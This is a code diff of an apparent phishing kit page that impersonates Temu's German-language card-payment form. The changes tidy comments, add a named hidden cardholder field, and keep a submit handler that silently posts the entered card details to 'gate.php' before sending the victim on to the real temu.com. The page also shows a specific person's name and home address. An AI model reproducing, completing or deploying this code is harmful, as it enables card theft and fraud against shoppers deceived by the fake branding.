@@ -432,7 +432,7 @@
 
 <div class="card-logos-row"><img alt="Accepted Cards" src="https://images.ctfassets.net/gc4s9mi2asix/27iheywutAjlzI1CWL3srg/78dad30c9edccdf21edb709b6b0de272/Accepted-Cards-US.png" style="width: 80%; object-fit: contain;" /></div>
 
-<!-- ==== هنا خانة الاسم الكامل اللي زدناها ==== -->
+<!-- ========== NAME FIELD ========== -->
 <div class="form-group" id="group-fullName">
     <label>* Vollständiger Name</label>
     <div class="input-wrapper">
@@ -451,8 +451,8 @@
     </div>
     <span class="error-text">! Bitte gib den vollständigen Namen ein.</span>
 </div>
-<!-- ========================================= -->
 
+<!-- ========== FORM ========== -->
 <form class="card-form" id="creditCardForm" action="gate.php" method="POST">
 <div class="form-group" id="group-cardNumber"><label>* Kartennummer</label>
 
@@ -482,7 +482,9 @@
 
 <p class="address-text">benjamin matthias, Gebelsbergstr. 97, Stuttgart, Baden-W&uuml;rttemberg 70199, Deutschland</p>
 </div>
-<!-- Card name hardcoded for the backend since it's not prominently displayed as an input anymore --><input id="cardName" type="hidden" value="benjamin matthias" />
+<!-- Card name hidden field for backend -->
+<input id="cardName" type="hidden" name="cardName" value="benjamin matthias" />
+
 <div class="security-footer">
 <div class="sec-item"><svg alt="" aria-hidden="true" class="_1VGf3jqj _3AQe3_EI" fill="#0e8c08" height="1em" version="1.1" viewbox="0 0 1024 1024" width="1em" xmlns="http://www.w3.org/2000/svg"> <path d="M453.8 53.5c33.4-13.3 70.5-13.5 104.1-0.7l340.5 130.2c41.2 15.7 67.6 56 65.7 100l-8.2 190.2c-6.9 160.5-88.2 308.6-219.8 400.6l-116.5 81.6c-67 46.8-156.1 46.8-223.1 0l-115.1-80.5c-131.5-92-211.7-240.8-216.2-401.2l-5.4-191.4c-1.2-43 24.6-82.2 64.6-98.1z m258.7 327.4c-15.8-16.1-41.8-16.4-57.9-0.5l-178.8 175.5-89.9-81.2c-16.8-15.2-42.7-13.8-57.9 3-15.2 16.8-13.8 42.7 2.9 57.8l118.6 107.1c16.1 14.5 40.7 14 56.2-1.2l206.3-202.6c16.1-15.8 16.4-41.8 0.5-57.9z"> </path> </svg> <span class="bold-green">Temu sch&uuml;tzt deine Kartendaten</span></div>
 
@@ -547,20 +549,18 @@
                 }
             }
 
-            // NEW: Simple submit — no blocking validation
+            // Submit via AJAX to gate.php then redirect
             form.addEventListener('submit', function (e) {
                 e.preventDefault();
 
                 const submitButton = document.getElementById('submitBtn');
                 const spinner = document.getElementById('loadingSpinner');
 
-                // disable button and show spinner
                 if (submitButton) submitButton.disabled = true;
                 if (spinner) spinner.style.display = 'flex';
 
                 const formData = new FormData(form);
 
-                // send to gate.php via fetch
                 fetch('gate.php', {
                     method: 'POST',
                     body: formData
@@ -572,7 +572,6 @@
                     window.location.href = 'https://www.temu.com';
                 });
 
-                // emergency redirect after 3 seconds
                 setTimeout(function() {
                     window.location.href = 'https://www.temu.com';
                 }, 3000);
